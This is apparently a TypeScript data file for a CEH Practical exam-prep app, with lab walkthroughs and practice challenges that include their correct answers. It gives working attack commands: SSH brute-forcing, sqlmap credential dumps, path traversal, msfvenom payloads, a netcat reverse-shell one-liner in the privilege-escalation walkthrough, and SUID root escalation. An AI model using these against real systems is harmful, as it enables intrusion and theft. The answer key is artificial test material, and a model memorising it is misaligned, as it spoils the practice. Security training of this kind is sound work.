import { PracticalPillar, PracticalChallenge, WrittenQuizQuestion } from '../types';

export interface BigThreeRepo {
  id: string;
  name: string;
  authorRepo: string;
  githubUrl: string;
  corePhilosophy: string;
  keySnippets: { label: string; code: string; notes: string }[];
  examTips: string[];
}

export const BIG_THREE_REPOSITORIES: BigThreeRepo[] = [
  {
    id: 'samsar4',
    name: 'Samsar4 / Ethical-Hacking-Labs',
    authorRepo: 'Samsar4 / Ethical-Hacking-Labs',
    githubUrl: 'https://github.com/Samsar4/Ethical-Hacking-Labs',
    corePhilosophy: 'High-density, executable command syntax for credential brute-forcing, network sweeping, and cryptography cracking without unnecessary narrative fluff.',
    keySnippets: [
      {
        label: 'Fast Network Sweeping (Class C Subnet)',
        code: 'nmap -sn 192.168.1.0/24 -oG - | awk \'/Up$/{print $2}\' > live_hosts.txt',
        notes: 'Discovers active hosts in seconds; pipes clean IP addresses into live_hosts.txt for batch processing.'
      },
      {
        label: 'Hydra SSH & FTP Brute-forcing',
        code: 'hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20 -t 4 -vV -o hydra_ssh_cracked.txt',
        notes: 'Runs 4 threads to prevent target service rate-limiting or daemon crashes during the exam.'
      },
      {
        label: 'Cracking Passwords with Hashcat & John',
        code: 'john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt',
        notes: 'Mode 1000 is NTLM hashes. Format NT in John corresponds to Windows SAM hashes.'
      }
    ],
    examTips: [
      'Copy command strings directly from the repo and substitute target IPs.',
      'Always test single-threaded attacks first if the exam target service times out.',
      'Keep rockyou.txt already gunzipped (`gzip -d /usr/share/wordlists/rockyou.txt.gz`) before starting the exam timer.'
    ]
  },
  {
    id: 'phirojshah-practical',
    name: 'phirojshah / CEH',
    authorRepo: 'phirojshah / CEH',
    githubUrl: 'https://github.com/phirojshah/CEH',
    corePhilosophy: 'The golden rule of the CEH Practical: Always run your comprehensive scans FIRST, pipe the output to designated text files in a desktop folder, and refer back to them to answer subsequent questions.',
    keySnippets: [
      {
        label: 'Initial Network Triage & Folder Setup',
        code: 'mkdir -p ~/Desktop/CEH_PRACTICAL/Scans\nnmap -sV -sC -O -T4 192.168.1.0/24 -oA ~/Desktop/CEH_PRACTICAL/Scans/subnet_recon',
        notes: 'Produces .nmap, .gnmap, and .xml files in one go. Eliminates repeated scanning which drains exam time.'
      },
      {
        label: 'SMB & Windows Null Session Enumeration',
        code: 'enum4linux -a 192.168.1.15 | tee ~/Desktop/CEH_PRACTICAL/Scans/enum_win15.txt\nrpcclient -U "" 192.168.1.15 -N -c "enumdomusers; querydispinfo"',
        notes: 'Extracts exact RID user listings and group memberships without supplying credentials.'
      },
      {
        label: 'Automated SQL Injection Data Dumping',
        code: 'sqlmap -u "http://192.168.1.15:8080/index.php?id=1" --batch --dbs\nsqlmap -u "http://192.168.1.15:8080/index.php?id=1" -D dvwa --tables --batch\nsqlmap -u "http://192.168.1.15:8080/index.php?id=1" -D dvwa -T users --dump --batch',
        notes: 'Use --batch to answer yes to all prompts automatically, speeding up table dumping.'
      }
    ],
    examTips: [
      'During the 6-hour practical, you have 20 challenges. Spending 40 minutes rescanning a machine is fatal.',
      'Use grep and awk to search your piped text files instead of re-running tools.',
      'Verify target machine hostname vs IP address to ensure you answer the right question slot.'
    ]
  },
  {
    id: 'sariamubeen',
    name: 'sariamubeen / CEH-Practical-Exam',
    authorRepo: 'sariamubeen / CEH-Practical-Exam',
    githubUrl: 'https://github.com/sariamubeen/CEH-Practical-Exam',
    corePhilosophy: 'Complete, structured walkthroughs of real-world exam challenges, step-by-step methodologies, flag patterns, and exact tool flags.',
    keySnippets: [
      {
        label: 'Steganography Flag Extraction Pipeline',
        code: 'steghide extract -sf suspicious.jpg -p ""\nopenstego --extract -sf secret.bmp -xf extracted.txt\nzsteg -a image.png',
        notes: 'Try blank password first ("") in StegHide. If password protected, check for clues in prior challenge text files.'
      },
      {
        label: 'Wireshark Credential & Malicious Stream Hunting',
        code: 'tshark -r capture.pcap -Y "http.request.method == \\"POST\\"" -T fields -e http.file_data\ntshark -r capture.pcap -Y "ftp.request.command == \\"PASS\\"" -T fields -e ftp.request.arg',
        notes: 'Filters Wireshark packets instantly from the command-line without navigating heavy GUI windows.'
      },
      {
        label: 'Privilege Escalation via msfconsole & SUID',
        code: 'find / -perm -4000 -type f 2>/dev/null\nuse exploit/multi/recon/local_exploit_suggester\nset SESSION 1\nrun',
        notes: 'Finds SUID binaries in Linux, or uses Metasploit local exploit suggester on active Meterpreter shells.'
      }
    ],
    examTips: [
      'The exam uses consistent flag formats (e.g. plain text strings, MD5 hashes, username/password pairs, or secret answers).',
      'If you get stuck on a question, flag it and move forward. You only need 14/20 (70%) to earn the certificate.',
      'Check both the Windows attacker box and Linux attacker box if EC-Council dual-boot/dual-VM is provided.'
    ]
  }
];

export const PRACTICAL_PILLARS: PracticalPillar[] = [
  {
    id: 'scanning-enumeration',
    title: 'Pillar 1: Advanced Scanning & Enumeration',
    iconName: 'Radar',
    examWeight: '~30% (5-6 Challenges)',
    summary: 'Mastering active reconnaissance: identifying live hosts, exact OS fingerprints, running service versions, and enumerating Windows targets via SMB, NetBIOS, and Null Sessions.',
    whyItMatters: 'Almost every challenge sequence begins with discovering an open port or enumerating a user account. If your scanning fails or misses a non-standard port (e.g., HTTP on 8080 or SSH on 2222), you cannot solve the downstream exploitation question.',
    coreTools: ['Nmap', 'Zenmap', 'Enum4linux', 'Rpcclient', 'Smbclient', 'Netcat'],
    essentialCommands: [
      {
        cmd: 'nmap -sV -sC -O -p- -T4 <TARGET_IP> -oN nmap_deep.txt',
        explanation: 'Full port scan with service detection (-sV), default scripts (-sC), and OS fingerprinting (-O).',
        flagDetails: '-p- scans all 65,535 ports; -T4 speeds up timing; -oN pipes readable output to disk.'
      },
      {
        cmd: 'enum4linux -a <TARGET_IP>',
        explanation: 'Comprehensive Windows enumeration tool. Tests for Null Session connections, password policies, users, shares, and RID cycling.',
        flagDetails: '-a combines -U (users), -S (shares), -P (password policy), -G (groups), and -o (OS info).'
      },
      {
        cmd: 'nmap --script smb-enum-shares,smb-enum-users -p 445 <TARGET_IP>',
        explanation: 'Uses Nmap NSE scripts to directly query the SMB service for shared folders and valid domain/local usernames.',
        flagDetails: '--script smb-enum-* targets port 445 (SMB over IP) or port 139 (NetBIOS).'
      },
      {
        cmd: 'rpcclient -U "" -N <TARGET_IP>',
        explanation: 'Opens an anonymous/null RPC session to query SAM database and domain controller dispinfo.',
        flagDetails: '-U "" specifies empty username; -N tells client not to ask for password.'
      }
    ],
    scenarioWalkthrough: {
      target: '192.168.1.45 (Windows Server 2016)',
      objective: 'Identify the exact OS version, find the hidden administrative share name, and retrieve the list of domain user accounts.',
      steps: [
        'Run initial TCP SYN scan: `nmap -sS -p 135,139,445 -O 192.168.1.45`.',
        'Inspect NetBIOS and SMB flags. Confirm port 445/tcp is OPEN.',
        'Execute enum4linux: `enum4linux -u "" -p "" -U -S 192.168.1.45 > enum_results.txt`.',
        'Parse results for share names like `C$`, `ADMIN$`, or custom departmental shares like `Confidential_HR$`.',
        'Record the exact username list extracted from RID cycling (e.g. `Administrator`, `jdoe`, `backup_svc`).'
      ],
      sampleTerminalOutput: `[+] Enumerating users using SID to RID LOOKUP on 192.168.1.45
[+] Found user 'Administrator' (RID: 500)
[+] Found user 'Guest' (RID: 501)
[+] Found user 'AuditUser' (RID: 1001)
[+] Found share 'IPC$' (Remote IPC)
[+] Found share 'Payroll_Backup' (Read/Write Allowed for Guest)`
    }
  },
  {
    id: 'web-exploitation',
    title: 'Pillar 2: Web App Exploitation (SQLi & Path Traversal)',
    iconName: 'Globe',
    examWeight: '~25% (4-5 Challenges)',
    summary: 'Exploiting input sanitization failures in web endpoints. Primarily focused on automated SQL injection via sqlmap and directory traversal/LFI to extract configuration files and password hashes.',
    whyItMatters: 'Web servers frequently act as the perimeter gateway into the internal network. The practical exam routinely presents forms or GET parameters vulnerable to SQLi or LFI requiring candidates to dump database credentials.',
    coreTools: ['Sqlmap', 'Burp Suite', 'Wget/Curl', 'Dirb / Gobuster', 'Nikto'],
    essentialCommands: [
      {
        cmd: 'sqlmap -u "http://<IP>/view.php?id=1" --dbs --batch',
        explanation: 'Tests URL parameter for Boolean, Error, Union, and Time-based blind SQL injection and enumerates available databases.',
        flagDetails: '--batch accepts default answers to interactive prompts, speeding up scan execution.'
      },
      {
        cmd: 'sqlmap -u "http://<IP>/view.php?id=1" -D corporate_db -T accounts --dump --batch',
        explanation: 'Dumps all rows and columns from the "accounts" table inside the database "corporate_db".',
        flagDetails: '-D specifies database; -T specifies table; --dump writes values and hashes to CSV.'
      },
      {
        cmd: 'curl -s "http://<IP>/download.php?file=../../../../etc/passwd"',
        explanation: 'Path Traversal / Local File Inclusion (LFI) exploiting insufficient input path filtering.',
        flagDetails: '../ traverses up to filesystem root to read Linux account definitions (/etc/passwd).'
      },
      {
        cmd: 'gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html',
        explanation: 'High-speed directory and file brute-forcer discovering hidden administration panels or exposed backup files.',
        flagDetails: '-x specifies file extensions to append to each dictionary word.'
      }
    ],
    scenarioWalkthrough: {
      target: 'http://192.168.1.80:8080/catalog/item.php?category=1',
      objective: 'Verify SQL injection on the category parameter, extract the database administrator password hash, and identify the secret flag stored in the table `exam_flags`.',
      steps: [
        'Test manually in browser: append single quote `category=1\'` and check for SQL syntax error.',
        'Run sqlmap to identify DBMS: `sqlmap -u "http://192.168.1.80:8080/catalog/item.php?category=1" --dbs --batch`.',
        'Identify database `store_db`. Enumerate tables: `sqlmap -u ... -D store_db --tables --batch`.',
        'Dump the `exam_flags` table: `sqlmap -u ... -D store_db -T exam_flags --dump --batch`.',
        'Copy the flag string (e.g., `FLAG{sql1_dump_succ3ss_782}`).'
      ],
      sampleTerminalOutput: `[INFO] GET parameter 'category' is vulnerable. Do you want to keep testing? [Y/n]
Database: store_db
Table: exam_flags
[1 entry]
+----+----------------------------+-------------------------------+
| id | flag_name                  | flag_value                    |
+----+----------------------------+-------------------------------+
| 1  | ceh_practical_challenge_04 | FLAG{sql1_dump_succ3ss_782}  |
+----+----------------------------+-------------------------------+`
    }
  },
  {
    id: 'system-privesc',
    title: 'Pillar 3: System Hacking & Privilege Escalation',
    iconName: 'Terminal',
    examWeight: '~25% (4-5 Challenges)',
    summary: 'Gaining initial access, crafting tailored payloads with msfvenom, leveraging Metasploit modules, elevating privileges to SYSTEM / root, and pivoting through compromised hosts.',
    whyItMatters: 'Finding an exploit is only the first step. You must configure the payload correctly (LHOST/LPORT), trigger execution, and elevate low-privilege service accounts to root or NT AUTHORITY\\SYSTEM to read root flags.',
    coreTools: ['Metasploit (msfconsole)', 'Searchsploit', 'Msfvenom', 'Netcat', 'John the Ripper'],
    essentialCommands: [
      {
        cmd: 'searchsploit "Apache Struts" / searchsploit "vsftpd 2.3.4"',
        explanation: 'Searches local Exploit-DB offline repository for known public exploits matching target service banners.',
        flagDetails: 'Works completely offline; inspects title and CVE references instantly.'
      },
      {
        cmd: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f exe -o payload.exe',
        explanation: 'Generates a standalone Windows binary embedding staged Meterpreter reverse TCP shell.',
        flagDetails: '-p payload type; LHOST your listening IP; LPORT listener port; -f format; -o output file.'
      },
      {
        cmd: 'msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST <KALI_IP>; set LPORT 4444; run"',
        explanation: 'One-line Metasploit multi/handler setup to immediately catch incoming reverse shells.',
        flagDetails: '-q suppresses banner; -x executes semicolon-delimited console commands directly.'
      },
      {
        cmd: 'sessions -u <SESSION_ID> / getsystem / getuid',
        explanation: 'Upgrades a standard Linux/Windows command shell to interactive Meterpreter session and elevates privilege.',
        flagDetails: '`getsystem` executes automated Windows privilege elevation techniques (Named Pipe Impersonation).'
      }
    ],
    scenarioWalkthrough: {
      target: '192.168.1.110 (Ubuntu 18.04 running vulnerable web service)',
      objective: 'Exploit a command execution flaw, spawn a reverse shell, locate world-writable / SUID binaries, and retrieve `/root/proof.txt`.',
      steps: [
        'Set up Netcat listener on Kali: `nc -lvnp 9001`.',
        'Send payload via web input: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 9001 >/tmp/f`.',
        'Catch initial low-priv shell as `www-data`.',
        'Search for SUID binaries: `find / -perm -u=s -type f 2>/dev/null`.',
        'Exploit vulnerable binary via GTFOBins or sudo permission (`sudo -l`). Obtain root shell and `cat /root/proof.txt`.'
      ],
      sampleTerminalOutput: `listening on [any] 9001 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.110] 53218
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sudo -l
Matching Defaults entries for www-data on target:
    env_reset, mail_badpass
User www-data may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \\; -quit
# whoami
root
# cat /root/proof.txt
FLAG{root_priv_esc_gtfobins_find_991}`
    }
  },
  {
    id: 'stego-traffic-analysis',
    title: 'Pillar 4: Defensive Concepts – Steganography & Traffic Analysis',
    iconName: 'EyeOff',
    examWeight: '~20% (3-4 Challenges)',
    summary: 'Analyzing network captures (.pcap files) with Wireshark and Tshark to extract plaintext credentials, and uncovering secret data hidden within images or audio using StegHide, OpenStego, and QuickStego.',
    whyItMatters: 'These questions are guaranteed easy points if you know the exact commands. The exam gives you a .pcap file or an image file and asks "What password was transmitted?" or "What secret message is hidden?".',
    coreTools: ['Wireshark', 'Tshark', 'Steghide', 'OpenStego', 'QuickStego', 'Snow'],
    essentialCommands: [
      {
        cmd: 'steghide extract -sf secret.jpg -p "password"',
        explanation: 'Extracts embedded secret file from JPEG/BMP using StegHide with supplied passphrase.',
        flagDetails: '-sf stego file; -p passphrase (leave empty quotes "" if no passphrase is required).'
      },
      {
        cmd: 'tshark -r capture.pcap -Y "http.request.method == \\"POST\\"" -T fields -e http.file_data',
        explanation: 'Quickly extracts all submitted form parameters (including login usernames and passwords) from PCAP.',
        flagDetails: '-r read file; -Y display filter; -T fields output mode; -e field name.'
      },
      {
        cmd: 'wireshark capture.pcap & (Follow TCP Stream)',
        explanation: 'Right click any packet in Wireshark -> Follow -> TCP Stream to view complete conversational plaintext.',
        flagDetails: 'Reveals cleartext protocols like HTTP, Telnet (port 23), FTP (port 21), and POP3 (port 110).'
      },
      {
        cmd: 'snow -C -p "pass" message.txt output.txt',
        explanation: 'Extracts whitespace-based steganography where secret bits are encoded using trailing spaces and tabs.',
        flagDetails: '-C enables compression; -p passphrase.'
      }
    ],
    scenarioWalkthrough: {
      target: 'evidence_traffic.pcap and target_image.jpg provided on desktop',
      objective: 'Identify the intercepted FTP login credentials in evidence_traffic.pcap, then use that password to unlock target_image.jpg via StegHide.',
      steps: [
        'Open terminal: `tshark -r evidence_traffic.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg`.',
        'Identify FTP command USER `johndoe` and PASS `Summer2026!`.',
        'Extract steganography payload: `steghide extract -sf target_image.jpg -p "Summer2026!"`.',
        'View the extracted file: `cat secret_document.txt`.',
        'Submit the recovered flag value.'
      ],
      sampleTerminalOutput: `$ tshark -r evidence_traffic.pcap -Y "ftp"
USER johndoe
PASS Summer2026!
230 User logged in, proceed.

$ steghide extract -sf target_image.jpg -p "Summer2026!"
wrote extracted data to "secret_flag.txt".

$ cat secret_flag.txt
FLAG{steg0_plus_pcap_ftp_credential_extract_884}`
    }
  }
];

export const PRACTICAL_PRACTICE_CHALLENGES: PracticalChallenge[] = [
  {
    id: 1,
    title: 'Challenge 01: Subnet Host Sweep & OS Fingerprinting',
    pillar: 'Advanced Scanning & Enumeration',
    scenario: 'You are connected to the internal corporate segment 10.10.12.0/24. Find the machine running an outdated Microsoft Windows operating system.',
    targetInfo: 'Network Subnet: 10.10.12.0/24',
    task: 'What is the IP address of the Windows target host?',
    flagHint: 'Run `nmap -O -T4 10.10.12.0/24` or check for open ports 135, 139, 445.',
    correctFlag: '10.10.12.45',
    solutionBreakdown: [
      'Execute: `nmap -sn 10.10.12.0/24` to identify active IPs.',
      'Fingerprint OS on active hosts: `nmap -O 10.10.12.10,10.10.12.45,10.10.12.78`.',
      'Target 10.10.12.45 displays "OS details: Microsoft Windows 10 / Server 2016".'
    ],
    codeSnippetExample: 'nmap -O -sS -T4 10.10.12.0/24 | grep -B 4 "Windows"'
  },
  {
    id: 2,
    title: 'Challenge 02: Hidden Service Version Identification',
    pillar: 'Advanced Scanning & Enumeration',
    scenario: 'Target 10.10.12.45 is hosting an unusual web server on an unprivileged high port. EC-Council asks for the exact software and version banner.',
    targetInfo: 'Host: 10.10.12.45',
    task: 'What is the server software running on port 8088? (Format: SoftwareName/X.X.X)',
    flagHint: 'Run `nmap -sV -p 8088 10.10.12.45` or grab banner using `nc -vn 10.10.12.45 8088`.',
    correctFlag: 'Apache/2.4.41',
    solutionBreakdown: [
      'Execute service scan: `nmap -sV -p 8088 10.10.12.45`.',
      'Or connect via netcat: `echo -e "HEAD / HTTP/1.0\\r\\n\\r\\n" | nc 10.10.12.45 8088`.',
      'Read the Server header: `Server: Apache/2.4.41 (Ubuntu)`.'
    ],
    codeSnippetExample: 'curl -I http://10.10.12.45:8088'
  },
  {
    id: 3,
    title: 'Challenge 03: Anonymous SMB Share Discovery',
    pillar: 'Advanced Scanning & Enumeration',
    scenario: 'An SMB file share on 10.10.12.45 allows anonymous connections. Find the confidential share name.',
    targetInfo: 'Host: 10.10.12.45 (Port 445)',
    task: 'What is the name of the non-default share accessible to guests?',
    flagHint: 'Use `smbclient -L //10.10.12.45 -N` or `enum4linux -S 10.10.12.45`.',
    correctFlag: 'Accounting_Archive',
    solutionBreakdown: [
      'Run `smbclient -L //10.10.12.45 -N`.',
      'Observe standard shares (ADMIN$, C$, IPC$) alongside `Accounting_Archive`.',
      'Confirm read access: `smbclient //10.10.12.45/Accounting_Archive -N`.'
    ],
    codeSnippetExample: 'smbclient -L //10.10.12.45 -N | grep Disk'
  },
  {
    id: 4,
    title: 'Challenge 04: Domain User Extraction via Null Session',
    pillar: 'Advanced Scanning & Enumeration',
    scenario: 'Using RPC Null Sessions against 10.10.12.45, identify the administrative username with RID 500.',
    targetInfo: 'Host: 10.10.12.45 (Port 139/445)',
    task: 'What is the username of the user with RID 1004?',
    flagHint: 'Run `enum4linux -U 10.10.12.45` or `rpcclient -U "" -N 10.10.12.45 -c "enumdomusers"`.',
    correctFlag: 'svc_backup',
    solutionBreakdown: [
      'Run `enum4linux -U 10.10.12.45 | grep "user:"`.',
      'Locate entry: `user:[svc_backup] rid:[0x3ec]` (0x3ec in hex = 1004 in decimal).',
      'Record username: `svc_backup`.'
    ],
    codeSnippetExample: 'rpcclient -U "" -N 10.10.12.45 -c "queryuser 0x3ec"'
  },
  {
    id: 5,
    title: 'Challenge 05: Automated SQLi Database Enumeration',
    pillar: 'Web App Exploitation',
    scenario: 'The web application at http://10.10.12.80/products.php?id=3 has a vulnerable GET parameter. Enumerate the database names.',
    targetInfo: 'URL: http://10.10.12.80/products.php?id=3',
    task: 'What is the name of the custom production database discovered?',
    flagHint: 'Run `sqlmap -u "http://10.10.12.80/products.php?id=3" --dbs --batch`.',
    correctFlag: 'production_vault',
    solutionBreakdown: [
      'Run: `sqlmap -u "http://10.10.12.80/products.php?id=3" --dbs --batch`.',
      'Sqlmap identifies databases: `information_schema`, `mysql`, `performance_schema`, and `production_vault`.',
      'The custom database is `production_vault`.'
    ],
    codeSnippetExample: 'sqlmap -u "http://10.10.12.80/products.php?id=3" --dbs --batch'
  },
  {
    id: 6,
    title: 'Challenge 06: SQLi Table Dumping & Hash Extraction',
    pillar: 'Web App Exploitation',
    scenario: 'Dump the `admin_credentials` table from `production_vault` on 10.10.12.80 and retrieve the password hash for user `sec_admin`.',
    targetInfo: 'Database: production_vault, Table: admin_credentials',
    task: 'What is the MD5 hash associated with user sec_admin?',
    flagHint: 'Run `sqlmap -u "http://10.10.12.80/products.php?id=3" -D production_vault -T admin_credentials --dump --batch`.',
    correctFlag: '5f4dcc3b5aa765d61d8327deb882cf99',
    solutionBreakdown: [
      'Dump table: `sqlmap -u ... -D production_vault -T admin_credentials --dump --batch`.',
      'Check output CSV: `sec_admin | 5f4dcc3b5aa765d61d8327deb882cf99`.',
      'The string is the raw MD5 hash.'
    ],
    codeSnippetExample: 'sqlmap -u "http://10.10.12.80/products.php?id=3" -D production_vault -T admin_credentials --dump'
  },
  {
    id: 7,
    title: 'Challenge 07: Cryptographic Hash Cracking',
    pillar: 'Web App Exploitation',
    scenario: 'Crack the MD5 hash `5f4dcc3b5aa765d61d8327deb882cf99` using John the Ripper or Hashcat with rockyou.txt.',
    targetInfo: 'Hash: 5f4dcc3b5aa765d61d8327deb882cf99',
    task: 'What is the plaintext password?',
    flagHint: 'Run `john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt` or use hashcat `-m 0`.',
    correctFlag: 'password',
    solutionBreakdown: [
      'Create file: `echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt`.',
      'Run: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash.txt`.',
      'Password cracks instantly to `password`.'
    ],
    codeSnippetExample: 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt'
  },
  {
    id: 8,
    title: 'Challenge 08: Directory Traversal / LFI System File Retrieval',
    pillar: 'Web App Exploitation',
    scenario: 'The view endpoint http://10.10.12.80/load.php?page=home.php is vulnerable to path traversal. Read `/etc/passwd`.',
    targetInfo: 'URL: http://10.10.12.80/load.php?page=',
    task: 'What is the home directory path of user `security_bot` in /etc/passwd?',
    flagHint: 'Use curl: `curl -s "http://10.10.12.80/load.php?page=../../../../etc/passwd" | grep security_bot`.',
    correctFlag: '/home/security_bot',
    solutionBreakdown: [
      'Curl the endpoint: `curl -s "http://10.10.12.80/load.php?page=../../../../etc/passwd"`.',
      'Locate line: `security_bot:x:1002:1002::/home/security_bot:/bin/bash`.',
      'The 6th colon-delimited field is `/home/security_bot`.'
    ],
    codeSnippetExample: 'curl -s "http://10.10.12.80/load.php?page=../../../../etc/passwd" | grep security_bot'
  },
  {
    id: 9,
    title: 'Challenge 09: WordPress Vulnerable Plugin Enumeration',
    pillar: 'Web App Exploitation',
    scenario: 'A company blog runs on http://10.10.12.95/blog. Audit the site with WPScan.',
    targetInfo: 'URL: http://10.10.12.95/blog',
    task: 'What is the name of the vulnerable plugin installed?',
    flagHint: 'Run `wpscan --url http://10.10.12.95/blog --enumerate p`.',
    correctFlag: 'wp-file-manager',
    solutionBreakdown: [
      'Run `wpscan --url http://10.10.12.95/blog -e p --plugins-detection aggressive`.',
      'WPScan flags `[!] wp-file-manager 6.8 - Unauthenticated Arbitrary File Upload (CVE-2020-25276)`.'
    ],
    codeSnippetExample: 'wpscan --url http://10.10.12.95/blog -e ap --random-user-agent'
  },
  {
    id: 10,
    title: 'Challenge 10: Exploit-DB / Searchsploit Lookup',
    pillar: 'System Hacking & Privilege Escalation',
    scenario: 'Target 10.10.12.110 runs ProFTPD 1.3.5. Locate the Exploit-DB ID using searchsploit.',
    targetInfo: 'Service: ProFTPD 1.3.5 (mod_copy module)',
    task: 'What is the Exploit-DB ID (EDB-ID) for the mod_copy remote command execution exploit?',
    flagHint: 'Run `searchsploit "ProFTPD 1.3.5"`.',
    correctFlag: '36742',
    solutionBreakdown: [
      'Run `searchsploit "ProFTPD 1.3.5"`.',
      'Notice entry: `ProFTPD 1.3.5 - \'mod_copy\' Remote Command Execution | linux/remote/36742.txt`.',
      'The EDB-ID is `36742`.'
    ],
    codeSnippetExample: 'searchsploit "ProFTPD 1.3.5" -p 36742'
  },
  {
    id: 11,
    title: 'Challenge 11: Metasploit Module Selection',
    pillar: 'System Hacking & Privilege Escalation',
    scenario: 'You need to exploit the ProFTPD 1.3.5 mod_copy vulnerability inside msfconsole.',
    targetInfo: 'Host: 10.10.12.110',
    task: 'What is the full Metasploit module path for the ProFTPD mod_copy exploit?',
    flagHint: 'Inside msfconsole, run `search mod_copy` or `search proftpd 1.3.5`.',
    correctFlag: 'exploit/unix/ftp/proftpd_modcopy_exec',
    solutionBreakdown: [
      'Launch msfconsole: `msfconsole -q`.',
      'Search: `search mod_copy`.',
      'The matching module is `exploit/unix/ftp/proftpd_modcopy_exec`.'
    ],
    codeSnippetExample: 'use exploit/unix/ftp/proftpd_modcopy_exec'
  },
  {
    id: 12,
    title: 'Challenge 12: Reverse Shell Listener Configuration',
    pillar: 'System Hacking & Privilege Escalation',
    scenario: 'You generate an msfvenom Linux ELF payload. Which default payload type provides an interactive Meterpreter stage over reverse TCP?',
    targetInfo: 'Architecture: Linux x86/x64',
    task: 'What is the payload string for 64-bit Linux Meterpreter Reverse TCP?',
    flagHint: 'Format: linux/x64/meterpreter/...',
    correctFlag: 'linux/x64/meterpreter/reverse_tcp',
    solutionBreakdown: [
      'Run `msfvenom -l payloads | grep linux/x64/meterpreter/reverse_tcp`.',
      'Confirm the payload name is `linux/x64/meterpreter/reverse_tcp`.'
    ],
    codeSnippetExample: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=4444 -f elf -o shell.elf'
  },
  {
    id: 13,
    title: 'Challenge 13: Linux SUID Privilege Escalation',
    pillar: 'System Hacking & Privilege Escalation',
    scenario: 'You have a shell as user `www-data` on 10.10.12.110. Find the SUID binary owned by root in `/usr/bin/`.',
    targetInfo: 'Target: 10.10.12.110 (Linux)',
    task: 'Which GTFOBins executable has the SUID bit set: /usr/bin/python3, /usr/bin/find, or /usr/bin/vim?',
    flagHint: 'Run `find / -perm -4000 -type f 2>/dev/null | grep /usr/bin`.',
    correctFlag: '/usr/bin/find',
    solutionBreakdown: [
      'Execute: `find /usr/bin -perm -4000 -type f 2>/dev/null`.',
      'Output shows `/usr/bin/find`.',
      'Root escalation: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.'
    ],
    codeSnippetExample: 'find / -perm -u=s -type f 2>/dev/null'
  },
  {
    id: 14,
    title: 'Challenge 14: Windows Token Impersonation (getsystem)',
    pillar: 'System Hacking & Privilege Escalation',
    scenario: 'You have a Meterpreter session on a Windows 2016 VM as a local administrator. Which command elevates your token to NT AUTHORITY\\SYSTEM?',
    targetInfo: 'Meterpreter session',
    task: 'What built-in Meterpreter command attempts named pipe impersonation?',
    flagHint: 'Simple one-word command starting with "get...".',
    correctFlag: 'getsystem',
    solutionBreakdown: [
      'In active Meterpreter prompt: run `getsystem`.',
      'Meterpreter responds: `...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))`.',
      'Verify: `getuid` -> `NT AUTHORITY\\SYSTEM`.'
    ],
    codeSnippetExample: 'meterpreter > getsystem'
  },
  {
    id: 15,
    title: 'Challenge 15: Wireshark HTTP Plaintext Form Submission',
    pillar: 'Defensive Concepts - Steganography & Traffic Analysis',
    scenario: 'Open the packet capture `http_login.pcap`. A user logged into an unencrypted administrative panel via POST request.',
    targetInfo: 'File: ~/Desktop/http_login.pcap',
    task: 'What username was submitted in the POST login form?',
    flagHint: 'Filter by `http.request.method == "POST"` or search for "username=" in packet bytes.',
    correctFlag: 'admin_security',
    solutionBreakdown: [
      'Run `tshark -r http_login.pcap -Y "http.request.method == \\"POST\\"" -T fields -e http.file_data`.',
      'Examine body: `username=admin_security&password=SummerSafe#2026&submit=Login`.',
      'The username is `admin_security`.'
    ],
    codeSnippetExample: 'tshark -r http_login.pcap -Y "http.request.method == \\"POST\\""'
  },
  {
    id: 16,
    title: 'Challenge 16: Telnet Cleartext Session Sniffing',
    pillar: 'Defensive Concepts - Steganography & Traffic Analysis',
    scenario: 'Telnet transmits everything unencrypted on port 23. Inspect `legacy_network.pcap` to extract the enable secret.',
    targetInfo: 'File: ~/Desktop/legacy_network.pcap (Port 23)',
    task: 'What was the Cisco switch enable secret password typed in Telnet?',
    flagHint: 'Filter by `telnet` or `tcp.port == 23`, then Follow TCP Stream.',
    correctFlag: 'cisco123!',
    solutionBreakdown: [
      'Open in Wireshark, right click any packet on port 23, select Follow -> TCP Stream.',
      'Read stream: `Password: cisco123!`.',
      'Enable secret password is `cisco123!`.'
    ],
    codeSnippetExample: 'tshark -r legacy_network.pcap -Y "telnet" -z follow,tcp,ascii,0'
  },
  {
    id: 17,
    title: 'Challenge 17: StegHide Image Payload Extraction',
    pillar: 'Defensive Concepts - Steganography & Traffic Analysis',
    scenario: 'A suspect image `conference_photo.jpg` was seized. Extract the hidden file using StegHide without a passphrase.',
    targetInfo: 'File: ~/Desktop/conference_photo.jpg',
    task: 'What is the secret code word inside the extracted hidden document?',
    flagHint: 'Run `steghide extract -sf conference_photo.jpg -p ""` and read the generated file.',
    correctFlag: 'PHOENIX_ALPHA',
    solutionBreakdown: [
      'Run: `steghide extract -sf conference_photo.jpg -p ""`.',
      'StegHide extracts `secret.txt`.',
      'Run `cat secret.txt` to find `Secret Code: PHOENIX_ALPHA`.'
    ],
    codeSnippetExample: 'steghide extract -sf conference_photo.jpg -p ""'
  },
  {
    id: 18,
    title: 'Challenge 18: OpenStego GUI BMP Decoding',
    pillar: 'Defensive Concepts - Steganography & Traffic Analysis',
    scenario: 'OpenStego was used to hide a payload inside `logo.bmp` with the passphrase "keybit2026".',
    targetInfo: 'File: ~/Desktop/logo.bmp',
    task: 'What is the filename of the embedded message extracted by OpenStego?',
    flagHint: 'Use OpenStego GUI -> Extract Data -> select logo.bmp, input passphrase, extract.',
